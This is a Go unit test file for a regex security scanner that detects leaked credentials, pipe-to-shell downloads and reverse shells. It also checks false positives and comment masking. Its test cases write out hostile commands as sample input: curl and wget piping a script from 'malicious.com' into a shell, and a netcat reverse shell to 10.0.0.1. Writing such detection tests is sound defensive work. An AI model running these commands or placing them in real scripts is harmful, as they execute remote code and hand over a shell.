package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		filename    string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			filename:    "main.go",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			filename:    "config.js",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			filename:    "config.py",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			filename:    "key.pem",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			filename:    "config.rb",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | bash",
			filename:    "script.sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | sh",
			filename:    "script.sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Curl Multiline Pipe Bash",
			content:     "curl https://malicious.com/install.sh \\\n | bash",
			filename:    "script.sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			filename:    "attack.sh",
			wantFinding: "Reverse Shell",
		},
		// False Positive Checks
		{
			name:        "Sync -e (False Positive Check)",
			content:     "sync -e something", // Should not match nc -e
			filename:    "script.sh",
			wantFinding: "",
		},
		{
			name:        "Curling (False Positive Check)",
			content:     "curling stone | bash", // Should not match curl | bash
			filename:    "script.sh",
			wantFinding: "",
		},
		{
			name:        "Curl Unrelated Multiline (False Positive)",
			content:     "curl http://example.com/file\n# some comments\n# ...\ncat file | bash",
			filename:    "script.sh",
			wantFinding: "",
		},
		// Masking Checks
		{
			name:        "Masked Comment with AWS Key (Go)",
			content:     "// var key = \"AKIAIOSFODNN7EXAMPLE\"",
			filename:    "main.go",
			wantFinding: "", // Should be masked
		},
		{
			name:        "Masked Block Comment with AWS Key (Java)",
			content:     "/* \n var key = \"AKIAIOSFODNN7EXAMPLE\" \n */",
			filename:    "App.java",
			wantFinding: "", // Should be masked
		},
		{
			name:        "Unmasked AWS Key in Code (Go)",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\" // Real key",
			filename:    "main.go",
			wantFinding: "AWS Access Key",
		},
		// String Literal Handling Checks (Regression Test)
		{
			name:        "AWS Key inside string with // (Go)",
			content:     "var url = \"http://example.com//AKIAIOSFODNN7EXAMPLE\"",
			filename:    "main.go",
			wantFinding: "AWS Access Key", // Should NOT be masked
		},
		{
			name:        "AWS Key inside string with /* */ (Go)",
			content:     "var s = \"/* AKIAIOSFODNN7EXAMPLE */\"",
			filename:    "main.go",
			wantFinding: "AWS Access Key", // Should NOT be masked
		},
		{
			name:        "AWS Key inside backticks with // (Go/JS)",
			content:     "`// AKIAIOSFODNN7EXAMPLE`",
			filename:    "main.js",
			wantFinding: "AWS Access Key", // Should NOT be masked
		},
		{
			name:        "AWS Key inside single quotes with // (JS)",
			content:     "var s = '// AKIAIOSFODNN7EXAMPLE'",
			filename:    "main.js",
			wantFinding: "AWS Access Key", // Should NOT be masked
		},
		{
			name:        "Escaped quote does not close string (Go)",
			content:     "var s = \"\\\" // AKIAIOSFODNN7EXAMPLE\"",
			filename:    "main.go",
			wantFinding: "AWS Access Key", // Should NOT be masked
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.filename, tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
